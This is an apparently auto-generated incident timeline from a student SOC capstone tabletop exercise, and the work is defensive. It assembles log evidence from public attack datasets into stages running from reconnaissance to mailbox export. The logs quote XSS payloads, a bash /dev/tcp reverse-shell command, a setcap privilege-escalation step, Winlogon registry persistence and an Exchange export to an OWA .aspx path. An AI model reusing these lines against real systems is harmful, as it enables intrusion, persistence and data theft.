# Incident Timeline

**Project:** DEPI Project 5 - AI-Assisted SOC Automation & Full Incident Response Capstone
**Week:** 4 - Full Capstone IR Simulation & Reporting
**Scenario:** W4-TT-01 - Composite multi-stage intrusion - tabletop simulation
**Generated:** 2026-11-26T02:47:58+00:00 by `Week-4/IR/build_reports.py` from `Week-4/Output/` (data generated 2026-11-26T02:47:58+00:00)
**Status:** DRAFT - acceptance pending human sign-off


## Simulation boundary

- Every stage is represented by real, hash-verifiable evidence that already exists in Week-2 (datasets, OpenObserve alert evidence, verified timelines) and Week-3 (tickets, audit logs).
- The datasets come from different public sources and different years. The chain that links the stages is a scenario construct for the tabletop exercise; causal links between stages are NOT observed in the data.
- Timeline order is the scenario stage order. Timestamps shown are the original dataset timestamps and are never shifted or invented.
- No live SIEM, no live TheHive, no live threat-intelligence feed, no remediation is executed. Containment/eradication/recovery items are proposals that require a recorded analyst decision.


Full machine-readable timeline (every source event): `Week-4/Output/incident_timeline.csv` (192 events). Below: first 4 + last 4 events per case.


Timestamp quality legend: `original_utc` = original UTC time in the dataset; `original_with_offset` = original local time with offset; `no_year_no_timezone` = syslog time without year/zone (never inferred); `original_no_timezone` = original time, zone not recorded.


## S1 - Reconnaissance (Reconnaissance / Discovery, network)


### NT-01 - Vertical TCP port scan

| Original timestamp | Quality | Ref | Event |
|---|---|---|---|
| 2026-05-26T06:05:07.694185Z | original_utc | E002 | udp 192.168.16.130:49949 -> 192.168.16.1:53 S0 |
| 2026-05-26T06:07:27.414749Z | original_utc | E003 | tcp 192.168.16.132:44834 -> 192.168.16.130:80 REJ |
| 2026-05-26T06:07:28.502707Z | original_utc | E004 | tcp 192.168.16.132:44836 -> 192.168.16.130:2000 REJ |
| 2026-05-26T06:08:35.524432Z | original_utc | E005 | tcp 192.168.16.132:44372 -> 192.168.16.130:8888 REJ |
| ... |  |  | 22 more verified events in incident_timeline.csv |
| 2026-05-26T06:19:00.002947Z | original_utc | E028 | tcp 192.168.16.132:44372 -> 192.168.16.130:2043 REJ |
| 2026-05-26T06:19:10.930346Z | original_utc | E029 | tcp 192.168.16.132:44372 -> 192.168.16.130:1 REJ |
| 2026-05-26T06:19:45.683665Z | original_utc | E030 | tcp 192.168.16.132:44372 -> 192.168.16.130:6739 REJ |
| 2026-05-26T06:21:12.433434Z | original_utc | E031 | udp 192.168.16.130:51814 -> 192.168.16.1:53 S0 |

*Selected evidence shown; the full source contains 65895 records - see source files.*

Sources: `Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Timeline.csv`, `Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Case-Study.md`, `Week-2/Data/Real-Datasets/Network-Attacks/NT-01-Port-Scanning/NT-01-Verified-Full-Source-Statistics.json`


## S2 - Web-tier attack (Initial Access attempt, web)


### SIEM-WEB-001 - High-rate HTTP requests from a single source

| Original timestamp | Quality | Ref | Event |
|---|---|---|---|
| 2025-10-07T02:14Z | original_utc_minute | W001 | 112 HTTP requests from 255.102.154.224 in one minute (threshold 80); GET 200 x88, POST 200 x14, GET 302 x10 |

*Selected evidence shown; the full source contains 112 records - see source files.*

Sources: `Week-2/Evidence/SIEM-OpenObserve/SIEM05_Auto_Alert_AI_Triage_469dc3deb13af6394b.json`, `Week-2/Evidence/SIEM-OpenObserve/SIEM05_Controlled_AI_Reanalysis_20261023.json`


### SIEM-WEB-004 - Cross-site scripting (XSS) payloads

| Original timestamp | Quality | Ref | Event |
|---|---|---|---|
| 13/Oct/2024:09:38:07 +0000 | original_with_offset | ZwuU-873D9JP20xgx6@OtgAAAAA | HTTP 500 for XSS payload /index.php?p="`'><script>\x7Ejavascript:alert(1)</script>&debug_url=1 from 192.168.171.129 (tx ZwuU-873D9JP20xgx6@OtgAAAAA) |
| 13/Oct/2024:09:38:06 +0000 | original_with_offset | ZwuU-iAtf3OzxrG7aRST3wAAAAU | HTTP 500 for XSS payload /index.php?p="`'><script>\xE2\x80\xAFjavascript:alert(1)</script>&debug_url=1 from 192.168.171.129 (tx ZwuU-iAtf3OzxrG7aRST3wAAAAU) |
| 13/Oct/2024:09:38:05 +0000 | original_with_offset | ZwuU-cU9wzVu0YTv9ijcSwAAAAI | HTTP 500 for XSS payload /index.php?p="`'><script>\x0Ajavascript:alert(1)</script>&debug_url=1 from 192.168.171.129 (tx ZwuU-cU9wzVu0YTv9ijcSwAAAAI) |

Sources: `Week-2/Evidence/SIEM-OpenObserve/SIEM07_XSS_004_AI_Triage_6ba5792eef667c9cf8.json`, `Week-2/Evidence/SIEM-OpenObserve/SIEM07_XSS_004_AI_Triage_843425fa737b11ef71.json`, `Week-2/Evidence/SIEM-OpenObserve/SIEM07_XSS_004_AI_Triage_fad10ea2b71bb2bc09.json`


## S3 - Credential attack (Credential Access, auth)


### SIEM-AUTH-002 - SSH brute force against root

| Original timestamp | Quality | Ref | Event |
|---|---|---|---|
| Dec 10 11:01 | no_year_no_timezone | A001 | 30 failed passwords for root from 183.62.140.253 within one minute (threshold 5) |
| Dec 10 11:01:01 | no_year_no_timezone | A002 | Failed password for root from 183.62.140.253 port 51395 (source line 1621) |
| Dec 10 11:01:02 | no_year_no_timezone | A003 | Failed password for root from 183.62.140.253 port 51830 (source line 1624) |
| Dec 10 11:01:04 | no_year_no_timezone | A004 | Failed password for root from 183.62.140.253 port 52182 (source line 1627) |
| ... |  |  | 1 more verified events in incident_timeline.csv |
| Dec 10 11:01:08 | no_year_no_timezone | A006 | Failed password for root from 183.62.140.253 port 52850 (source line 1633) |
| Dec 10 11:01:10 | no_year_no_timezone | A007 | Failed password for root from 183.62.140.253 port 53160 (source line 1636) |
| Dec 10 11:01:13 | no_year_no_timezone | A008 | Failed password for root from 183.62.140.253 port 53630 (source line 1639) |
| Dec 10 11:01:14 | no_year_no_timezone | A009 | Failed password for root from 183.62.140.253 port 54049 (source line 1642) |

*Selected evidence shown; the full source contains 30 records - see source files.*

Sources: `Week-2/Evidence/SIEM-OpenObserve/SIEM06_Auth_002_AI_Triage_a823d14b61f061f795.json`


### LT-01 - SSH password guessing (verified timeline)

| Original timestamp | Quality | Ref | Event |
|---|---|---|---|
| Dec 10 10:54:27 | no_year_no_timezone | E001 | invalid_user_reference |
| Dec 10 10:54:27 | no_year_no_timezone | E002 | pam_authentication_failure |
| Dec 10 10:54:29 | no_year_no_timezone | E003 | failed_password user=zhangyan from 183.62.140.253 |
| Dec 10 10:54:29 | no_year_no_timezone | E004 | session_disconnection |
| ... |  |  | 34 more verified events in incident_timeline.csv |
| Dec 10 10:54:50 | no_year_no_timezone | E039 | failed_password user=root from 183.62.140.253 |
| Dec 10 10:54:50 | no_year_no_timezone | E040 | session_disconnection |
| Dec 10 10:54:51 | no_year_no_timezone | E041 | pam_authentication_failure |
| Dec 10 10:54:52 | no_year_no_timezone | E042 | failed_password user=root from 183.62.140.253 |

Sources: `Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Verified-Timeline.csv`, `Week-2/Data/Real-Datasets/Linux-Attacks/LT-01-SSH-Brute-Force/LT-01-Case-Study.md`


## S4 - Execution (Execution, endpoint)


### SIEM-MAL-003 - Suspicious executable with DNS + outbound connection

| Original timestamp | Quality | Ref | Event |
|---|---|---|---|
| 2025-06-13T00:35:40.5074673+03:00 | original_with_offset | SYSMON-R2611 | Sysmon 1 process create C:\Users\WDAGUtilityAccount\AppData\Local\Temp\IXP001.TMP\2r8602.exe (parent C:\Users\WDAGUtilityAccount\AppData\Local\Temp\IXP000.TMP\N1F90.exe) |
| 2025-06-13T00:35:43.1123186+03:00 | original_with_offset | SYSMON-R2740 | Sysmon 22 DNS query plodnittpw.lat |
| 2025-06-13T00:35:43.1123429+03:00 | original_with_offset | SYSMON-R2741 | Sysmon 22 DNS query bloodyswif.lat |
| 2025-06-13T00:35:43.1123670+03:00 | original_with_offset | SYSMON-R2742 | Sysmon 22 DNS query washyceehsu.lat |
| ... |  |  | 4 more verified events in incident_timeline.csv |
| 2025-06-13T00:35:44.1278660+03:00 | original_with_offset | SYSMON-R2790 | Sysmon 22 DNS query savorraiykj.lat |
| 2025-06-13T00:35:44.1278879+03:00 | original_with_offset | SYSMON-R2791 | Sysmon 22 DNS query shoefeatthe.lat |
| 2025-06-13T00:35:44.1279185+03:00 | original_with_offset | SYSMON-R2792 | Sysmon 22 DNS query finickypwk.lat |
| 2025-06-13T00:35:44.1279330+03:00 | original_with_offset | SYSMON-R2793 | Sysmon 22 DNS query steamcommunity.com |

Sources: `Week-2/Evidence/SIEM-OpenObserve/SIEM06_Mal_003_AI_Triage_e05ccfe875e6a53524.json`


### LT-03 - Bash reverse-shell command pattern

| Original timestamp | Quality | Ref | Event |
|---|---|---|---|
| 2024-05-31T18:01:42.639983000Z | original_utc | E001 | /usr/bin/bash (parent /usr/bin/dash) user=root: bash -c 0<&53-;exec 53<>/dev/tcp/10.0.255.12/4444;sh <&53 >&53 2>&53 |

Sources: `Week-2/Data/Real-Datasets/Linux-Attacks/LT-03-Suspicious-Execution/LT-03-Verified-Timeline.csv`, `Week-2/Data/Real-Datasets/Linux-Attacks/LT-03-Suspicious-Execution/LT-03-Case-Study.md`


## S5 - Persistence and privilege-sensitive activity (Persistence / Privilege Escalation, endpoint)


### RT-04 - Winlogon Shell persistence

| Original timestamp | Quality | Ref | Event |
|---|---|---|---|
| 2019-06-14T22:22:17.9883707Z | original_utc | E001 | Sysmon 1 process create C:\Users\IEUser\Downloads\a.exe (parent C:\Windows\explorer.exe) |
| 2019-06-14T22:22:21.5039957Z | original_utc | E002 | Sysmon 11 file create C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe by C:\Users\IEUser\Downloads\a.exe |
| 2019-06-14T22:22:21.5352457Z | original_utc | E003 | Sysmon 13 registry set HKU\S-1-5-21-3583694148-1414552638-2922671848-1000\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell = "C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe",explorer.exe |
| 2019-06-14T22:23:13.8946207Z | original_utc | E017 | Sysmon 1 process create C:\Windows\System32\userinit.exe (parent C:\Windows\System32\winlogon.exe) |
| 2019-06-14T22:23:13.9571207Z | original_utc | E018 | Sysmon 1 process create C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe (parent C:\Windows\System32\userinit.exe) |
| 2019-06-14T22:23:13.9727457Z | original_utc | E019 | Sysmon 1 process create C:\Windows\explorer.exe (parent C:\Windows\System32\userinit.exe) |
| 2019-06-14T22:23:16.5928629Z | original_utc | E021 | Sysmon 1 process create C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe (parent C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe) |

Sources: `Week-2/Data/Real-Datasets/Windows-Attacks/RT-04-Persistence/RT-04-Verified-Timeline.csv`, `Week-2/Data/Real-Datasets/Windows-Attacks/RT-04-Persistence/RT-04-Case-Study.md`


### LT-02 - Privilege-sensitive sudo commands

| Original timestamp | Quality | Ref | Event |
|---|---|---|---|
| 2024-08-06T14:01:04.626000Z | original_utc | E001 | PROCTITLE: sudo systemctl status auditd.service (service_status_context) |
| 2024-08-06T14:01:04.646000Z | original_utc | E002 | PROCTITLE: sudo systemctl status auditd.service (service_status_context) |
| 2024-08-06T14:01:04.974000Z | original_utc | E003 | PROCTITLE: sudo systemctl status auditd.service (service_status_context) |
| 2024-08-06T14:01:13.666000Z | original_utc | E004 | PROCTITLE: sudo systemctl status SplunkForwarder.service (service_status_context) |
| ... |  |  | 13 more verified events in incident_timeline.csv |
| 2024-08-06T14:20:36.405000Z | original_utc | E018 | PROCTITLE: sudo setcap cap_setuid+ep ./priv_esc (capability_change_candidate) |
| 2024-08-06T14:20:36.413000Z | original_utc | E019 | PROCTITLE: sudo setcap cap_setuid+ep ./priv_esc (capability_change_candidate) |
| 2024-08-06T14:36:57.368000Z | original_utc | E020 | PROCTITLE: sudo setcap cap_setuid+ep ./priv_esc (capability_change_candidate) |
| 2024-08-06T14:36:57.376000Z | original_utc | E021 | PROCTITLE: sudo setcap cap_setuid+ep ./priv_esc (capability_change_candidate) |

Sources: `Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Verified-Timeline.csv`, `Week-2/Data/Real-Datasets/Linux-Attacks/LT-02-Privilege-Escalation/LT-02-Case-Study.md`


## S6 - Discovery and defense evasion (Discovery / Defense Evasion, endpoint)


### RT-02 - Security log cleared + share access checks

| Original timestamp | Quality | Ref | Event |
|---|---|---|---|
| 2019-01-20T07:29:57.8638931Z | original_utc | E001 | Event 1102 on WIN-77LTAPHIQ1R.example.corp: Windows Security audit log cleared (Event 1102); account: Administrator |
| 2019-01-20T07:30:10.6451168Z | original_utc | E002 | Event 5145 on WIN-77LTAPHIQ1R.example.corp: Network share access check (Event 5145): winreg, source 10.0.2.17 |
| 2019-01-20T07:30:10.6600994Z | original_utc | E003 | Event 5145 on WIN-77LTAPHIQ1R.example.corp: Network share access check (Event 5145): lsarpc, source 10.0.2.17 |
| 2019-01-20T07:30:10.6600994Z | original_utc | E004 | Event 5145 on WIN-77LTAPHIQ1R.example.corp: Network share access check (Event 5145): srvsvc, source 10.0.2.17 |

Sources: `Week-2/Data/Real-Datasets/Windows-Attacks/RT-02-Discovery/RT-02-Verified-Timeline.csv`, `Week-2/Data/Real-Datasets/Windows-Attacks/RT-02-Discovery/RT-02-Case-Study.md`


## S7 - Lateral movement (Lateral Movement, endpoint)


### RT-03 - WinRM remote command execution on DC

| Original timestamp | Quality | Ref | Event |
|---|---|---|---|
| 2019-05-16T01:31:36.4268707Z | original_utc | E001 | Sysmon 1 on DC1.insecurebank.local: winrshost.exe |
| 2019-05-16T01:31:36.4548923Z | original_utc | E002 | Sysmon 1 on DC1.insecurebank.local: cmd.exe |
| 2019-05-16T01:31:36.4568918Z | original_utc | E003 | Sysmon 1 on DC1.insecurebank.local: ipconfig.exe |

Sources: `Week-2/Data/Real-Datasets/Windows-Attacks/RT-03-Lateral-Movement/RT-03-Verified-Timeline.csv`, `Week-2/Data/Real-Datasets/Windows-Attacks/RT-03-Lateral-Movement/RT-03-Case-Study.md`


## S8 - Command and control (Command and Control, network)


### NT-03 - Periodic HTTP connections to external host

| Original timestamp | Quality | Ref | Event |
|---|---|---|---|
| 2019-01-10T20:06:29.067208Z | original_utc | E003 | tcp 192.168.1.199:59222 -> 46.101.251.172:80 SF bytes 149/171750 |
| 2019-01-10T20:06:30.793723Z | original_utc | E004 | tcp 192.168.1.199:59224 -> 46.101.251.172:80 S0 bytes 0/0 |
| 2019-01-10T20:06:37.954878Z | original_utc | E005 | tcp 192.168.1.199:59224 -> 46.101.251.172:80 S0 bytes -/- |
| 2019-01-10T20:06:46.194937Z | original_utc | E006 | tcp 192.168.1.199:59224 -> 46.101.251.172:80 S0 bytes -/- |
| ... |  |  | 15 more verified events in incident_timeline.csv |
| 2019-01-10T20:09:06.995369Z | original_utc | E022 | tcp 192.168.1.199:59240 -> 46.101.251.172:80 S0 bytes -/- |
| 2019-01-10T20:09:23.635372Z | original_utc | E023 | tcp 192.168.1.199:59240 -> 46.101.251.172:80 SF bytes 149/139570 |
| 2019-01-10T20:09:26.859046Z | original_utc | E024 | tcp 192.168.1.199:59244 -> 46.101.251.172:80 SF bytes 150/149980 |
| 2019-01-10T22:01:02.953055Z | original_utc | E025 | udp 192.168.1.199:123 -> 81.2.248.189:123 S0 bytes -/- |

*Selected evidence shown; the full source contains 237 records - see source files.*

Sources: `Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Timeline.csv`, `Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Case-Study.md`, `Week-2/Data/Real-Datasets/Network-Attacks/NT-03-C2-Beaconing/NT-03-Verified-Full-Source-Statistics.json`


### NT-02 - DNS chunk-style query burst

| Original timestamp | Quality | Ref | Event |
|---|---|---|---|
| 2026-05-26T15:56:25.484741Z | original_utc | E003 | DNS AAAA connectivity-check.ubuntu.com 192.168.16.131 -> 192.168.16.1 rcode=- |
| 2026-05-26T16:01:35.804592Z | original_utc | E004 | DNS AAAA connectivity-check.ubuntu.com 192.168.16.131 -> 192.168.16.1 rcode=- |
| 2026-05-26T16:03:49.098070Z | original_utc | E005 | DNS A portal.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR |
| 2026-05-26T16:03:50.113967Z | original_utc | E006 | DNS A mail.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR |
| ... |  |  | 16 more verified events in incident_timeline.csv |
| 2026-05-26T16:05:33.320414Z | original_utc | E023 | DNS A chunk233-f001b3344bc99da19a864543.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR |
| 2026-05-26T16:05:33.555093Z | original_utc | E024 | DNS A chunk250-ef566286fc3a33e1c288d41c.lab.test 192.168.16.132 -> 192.168.16.131 rcode=NOERROR |
| 2026-05-26T16:07:21.154854Z | original_utc | E025 | DNS AAAA ntp.ubuntu.com.localdomain 192.168.16.131 -> 192.168.16.1 rcode=- |
| 2026-05-26T16:11:36.424560Z | original_utc | E026 | DNS A connectivity-check.ubuntu.com 192.168.16.131 -> 192.168.16.1 rcode=- |

*Selected evidence shown; the full source contains 581 records - see source files.*

Sources: `Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Timeline.csv`, `Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Case-Study.md`, `Week-2/Data/Real-Datasets/Network-Attacks/NT-02-DNS-Anomaly/NT-02-Verified-Full-Source-Statistics.json`


### RT-01 - plink.exe RDP tunnel

| Original timestamp | Quality | Ref | Event |
|---|---|---|---|
| 2019-02-16T10:02:21.9344384Z | original_utc | E003 | Event 1 on PC01.example.corp: Sysmon process creation: C:\Users\IEUser\Desktop\plink.exe |
| 2019-02-16T10:02:22.9659216Z | original_utc | E004 | Event 3 on PC01.example.corp: Sysmon network connection event: destination 10.0.2.18:80 |
| 2019-02-16T10:02:48.5026416Z | original_utc | E005 | Event 3 on PC01.example.corp: Sysmon network connection event: destination 127.0.0.2:3389 |
| 2019-02-16T10:04:05.0927728Z | original_utc | E023 | Event 3 on PC01.example.corp: Sysmon network connection event: destination 127.0.0.2:3389 |

Sources: `Week-2/Data/Real-Datasets/Windows-Attacks/RT-01-C2/RT-01-Verified-Timeline.csv`, `Week-2/Data/Real-Datasets/Windows-Attacks/RT-01-C2/RT-01-Case-Study.md`


## S9 - Collection / exfiltration (hypothesis) (Collection / Exfiltration, email)


### SIEM-EXCH-005 - Exchange mailbox export to OWA .aspx path

| Original timestamp | Quality | Ref | Event |
|---|---|---|---|
| 11/21/2022 05:21:55 PM | original_no_timezone | EXCH-R1788 | [cmdlet audit log] New-ManagementRoleAssignment on win-dc-exch01.attackrange.local (record 1788): Cmdlet suceeded. Cmdlet New-ManagementRoleAssignment, parameters -Role "Mailbox Import Export" -User "Administrator@attackrange.local". |
| 2022-11-21T17:22:01 | original_no_timezone | EXCH-R1789 | New-MailboxExportRequest on win-dc-exch01.attackrange.local for Administrator@attackrange.local to \\win-dc-exch01.attackrange.local\C$\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\ZnTQs2wv.aspx (record 1789) |
| 11/21/2022 05:27:25 PM | original_no_timezone | EXCH-R1793 | [cmdlet audit log] Remove-MailboxExportRequest on win-dc-exch01.attackrange.local (record 1793): Cmdlet suceeded. Cmdlet Remove-MailboxExportRequest, parameters -Identity "Administrator@attackrange.local\OnmrPW8m8Uv" -Confirm "False". |
| 11/21/2022 05:27:27 PM | original_no_timezone | EXCH-R1794 | [cmdlet audit log] Search-Mailbox on win-dc-exch01.attackrange.local (record 1794): Cmdlet suceeded. Cmdlet Search-Mailbox, parameters -Identity "Administrator@attackrange.local" -SearchQuery "Subject:"AvcMRhPdI"" -Force "True" -DeleteContent "True". |
| 11/21/2022 08:03:50 PM | original_no_timezone | EXCH-R1891 | [cmdlet audit log] New-ManagementRoleAssignment on win-dc-exch01.attackrange.local (record 1891): Cmdlet suceeded. Cmdlet New-ManagementRoleAssignment, parameters -Role "Mailbox Import Export" -User "Administrator@attackrange.local". |
| 2022-11-21T20:03:51 | original_no_timezone | EXCH-R1892 | New-MailboxExportRequest on win-dc-exch01.attackrange.local for Administrator@attackrange.local to \\win-dc-exch01.attackrange.local\C$\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\43yYO1sP.aspx (record 1892) |
| 11/21/2022 08:09:02 PM | original_no_timezone | EXCH-R1896 | [cmdlet audit log] Remove-MailboxExportRequest on win-dc-exch01.attackrange.local (record 1896): Cmdlet suceeded. Cmdlet Remove-MailboxExportRequest, parameters -Identity "Administrator@attackrange.local\dYbLTCleBT" -Confirm "False". |
| 11/21/2022 08:09:04 PM | original_no_timezone | EXCH-R1897 | [cmdlet audit log] Search-Mailbox on win-dc-exch01.attackrange.local (record 1897): Cmdlet suceeded. Cmdlet Search-Mailbox, parameters -Identity "Administrator@attackrange.local" -SearchQuery "Subject:"Fay10dOWecFg"" -Force "True" -DeleteContent "True". |

Sources: `Week-2/Evidence/SIEM-OpenObserve/SIEM_EXCHANGE_005_21c4515e439a0b3b6a3f_AI_Triage.json`, `Week-2/Results/SIEM_EXCHANGE_005_Human_Reviewed.json`, `Week-2/Data/Exchange/msexchangemanagement.log`
